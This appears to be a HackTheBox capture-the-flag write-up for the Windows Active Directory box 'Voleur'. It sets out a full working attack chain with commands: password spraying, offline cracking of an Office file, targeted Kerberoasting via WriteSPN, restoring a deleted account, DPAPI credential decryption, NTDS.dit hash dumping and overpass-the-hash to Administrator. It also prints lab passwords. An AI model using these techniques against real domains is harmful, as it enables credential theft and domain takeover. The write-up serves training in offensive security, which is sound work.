# Voleur — HackTheBox (Windows, Medium)

## Summary

Voleur is a Windows Active Directory box built around an **assumed-breach** scenario (you start with low-privileged domain creds) where **NTLM authentication is disabled** — so every single step has to go over Kerberos. The chain runs through a cracked password-protected Excel file, a `WriteSPN` → targeted Kerberoasting attack, restoring a deleted user from the AD Recycle Bin, DPAPI credential recovery, an SSH key into a WSL Linux subsystem, and finally extracting a backed-up `NTDS.dit` to recover the Administrator hash.

The headline lesson: when NTLM is off, your whole workflow changes — you live and die by `krb5.conf`, clock sync, and `-k`. Treat that as the default for modern, hardened domains, not an edge case.

---

## Recon & Enumeration

Full TCP scan, then a service/script scan on the open ports:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.76 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.76
```

The port profile is a textbook domain controller — `53` (DNS), `88` (Kerberos), `389/636/3268` (LDAP), `445` (SMB), `9389` (ADWS) — for the domain `voleur.htb`. Two things stand out from the usual DC baseline:

- **`2222/tcp` running OpenSSH on Ubuntu.** SSH on a Windows DC is unusual and screams WSL / a Linux subsystem. Park that thought.
- **`5985` WinRM** is exposed, which matters the moment we hold working creds.

The first real signal comes when you test the provided creds:

```bash
nxc smb 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt'
# ... (NTLM:False) ... STATUS_NOT_SUPPORTED
```

`(NTLM:False)` plus `STATUS_NOT_SUPPORTED` is the tell: **NTLM is disabled domain-wide.** This isn't a credential problem — the server is refusing the auth *method*. From here, nothing works unless it goes over Kerberos.

### Setting up for Kerberos-only auth

Three things have to be right before Kerberos will cooperate, and all three bite silently if they're off:

1. **Hostname resolution** — the KDC is referenced by name, so add the mapping:
   ```bash
   echo "10.10.11.76 DC.voleur.htb voleur.htb DC" | sudo tee -a /etc/hosts
   ```
2. **`/etc/krb5.conf`** — realm `VOLEUR.HTB`, KDC `dc.voleur.htb`. NetExec can generate the template for you with `--generate-krb5-file`.
3. **Clock sync** — Kerberos rejects tickets outside a ~5-minute skew window (`KRB_AP_ERR_SKEW`). Sync to the DC:
   ```bash
   sudo ntpdate 10.10.11.76
   ```

With that in place, authenticate using `-k` (force Kerberos) and enumerate shares:

```bash
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

A non-standard **`IT`** share is readable. Spidering it turns up `First-Line Support/Access_Review.xlsx`.

---

## Foothold / Initial Access

### Cracking the Excel file

The spreadsheet is password-protected. Office encryption is crackable offline — `office2john` extracts the hash, John recovers the password:

```bash
office2john Access_Review.xlsx > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# football1
```

The sheet is an access review containing usernames, roles, and — crucially — **notes with service-account credentials**. Spray-verify them (NetExec exits on first success, so `--continue-on-success` to test all):

```bash
nxc smb DC.voleur.htb -u users.txt -p passes.txt -k --continue-on-success
```

Two valid service accounts fall out: **`svc_ldap`** and **`svc_iis`**.

### Finding the path with BloodHound

Collect graph data with `ryan.naylor` (note `--dns-tcp`, which matters against a DC that's picky about UDP DNS):

```bash
bloodhound-python -u ryan.naylor -d voleur.htb -p 'HollowOct31Nyt' -c all --zip -ns 10.10.11.76 --dns-tcp
```

The graph shows the key edge: **`svc_ldap` has `WriteSPN` over `svc_winrm`.**

### Targeted Kerberoasting (the WriteSPN mechanic)

This is the part worth articulating precisely, because it's a clean example of *why* an ACL becomes code execution:

- Normal Kerberoasting only works against accounts that **already have an SPN** — the SPN is what lets you request a TGS, whose encrypted portion is derived from the account's password hash and can be cracked offline.
- `svc_winrm` has no SPN. But `svc_ldap`'s `WriteSPN` right lets us **write the `servicePrincipalName` attribute** on `svc_winrm` ourselves — temporarily giving it an SPN so it becomes roastable. That's "targeted" Kerberoasting.

Get a TGT for `svc_ldap`, then run `targetedKerberoast`:

```bash
impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.76
export KRB5CCNAME=svc_ldap.ccache
python3 targetedKerberoast.py -d voleur.htb --dc-host DC -u svc_ldap@voleur.htb -k
```

It sets an SPN, requests the TGS-REP (`etype 23`, Hashcat mode **13100**), and cleans up. Crack it:

```bash
hashcat hashes.txt /usr/share/wordlists/rockyou.txt
# svc_winrm : AFireInsidedeOzarctica980219afi
```

`svc_winrm` is in **Remote Management Users**, so get a TGT and WinRM in for the user flag:

```bash
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

---

## Privilege Escalation

### Restoring a deleted user from the AD Recycle Bin

BloodHound (and the spreadsheet) flag that `svc_ldap` belongs to a non-standard group, **Restore Users** — i.e. it can restore deleted AD objects.

First, get a proper interactive token as `svc_ldap` (WinRM gives a network logon; we need a logon that carries the group membership). Upload **RunasCs** and run with logon type 9:

```powershell
./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell -c Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
```

A deleted user, **Todd Wolfe**, shows up — and the spreadsheet already leaked his password (`NightT1meP1dg3on14`). Restore him:

```powershell
Restore-ADObject 'CN=Todd Wolfe\0ADEL:<guid>,CN=Deleted Objects,DC=voleur,DC=htb'
```

**Mechanic to understand:** a deleted AD object isn't purged — it's tombstoned under `CN=Deleted Objects` with its attributes preserved (when the Recycle Bin is enabled). Restore reactivates it with its original password and group memberships intact, which is why a leaked old password suddenly works again.

### DPAPI credential recovery

`todd.wolfe` has read access to his archived profile on the `IT` share. Under `AppData\Roaming\Microsoft` live the two halves of a DPAPI secret:

- `Protect\<SID>\<master-key-guid>` — the **master key**
- `Credentials\<blob>` — the encrypted **credential blob**

DPAPI chains: the master key is unlocked with the *user's* password, and the master key then decrypts the blob.

```bash
# 1) decrypt the master key with Todd's SID + password
impacket-dpapi masterkey -file <guid> -sid S-1-5-21-...-1110 -password NightT1meP1dg3on14
# 2) decrypt the credential blob with the recovered key
impacket-dpapi credential -file <blob> -key 0x<decrypted-key>
```

Out comes domain creds for **`jeremy.combs`** (third-line support — broader access).

### SSH key → WSL → NTDS.dit

TGT + Evil-WinRM as `jeremy.combs`. In `C:\IT\Third-Line Support` there's a `Note.txt.txt` about moving backups to **WSL**, plus an **`id_rsa`**. This connects straight back to the odd `OpenSSH on 2222` from recon:

```bash
chmod 600 id_rsa
ssh -i id_rsa svc_backup@10.10.11.76 -p 2222
```

That lands a shell as `svc_backup` inside the Linux subsystem, which can see the Windows filesystem under `/mnt/c`. The backup folder holds an offline AD backup — `ntds.dit` plus the `SYSTEM` and `SECURITY` hives:

```bash
scp -i id_rsa -P 2222 "svc_backup@10.10.11.76:/mnt/c/IT/Third-Line Support/Backups/..." .
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

`SYSTEM` provides the boot key to decrypt the hashes in `ntds.dit`; `SECURITY` carries the domain secrets. Out comes the **Administrator NT hash**.

### Final auth

NTLM is still disabled, so you can't pass-the-hash directly to a service — but you *can* exchange the hash for a Kerberos TGT (overpass-the-hash), which is accepted:

```bash
impacket-getTGT voleur.htb/administrator -hashes :<admin-nt-hash>
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

Root flag secured.

---

## Key Takeaways

- **NTLM-disabled domains change your whole muscle memory.** Clock sync, `krb5.conf`, `/etc/hosts`, and `-k` are not optional, and a hash is useless until you convert it to a TGT. This is where modern hardened environments are heading — worth being fluent, not just aware.
- **`WriteSPN` is a full attack primitive, not a side note.** The precise reason it works: you create an SPN so the account becomes Kerberoastable (TGS-REP, etype 23 / Hashcat 13100), crack offline, clean up. Any write over `servicePrincipalName` is effectively a shot at that account's password.
- **The AD Recycle Bin is an under-looked privesc surface.** Tombstoned objects keep their attributes and memberships; a leaked old password + restore rights = account resurrection.
- **DPAPI is a two-stage chain** (user password → master key → credential blob). Knowing which file is which, and that you need the user's password for the master key, is the difference between decrypting it in two commands and flailing.
- **Odd ports are plot points.** SSH on 2222 on a Windows DC was the thread that tied the whole backup/WSL path together — recon findings should stay in your head until they're explained.
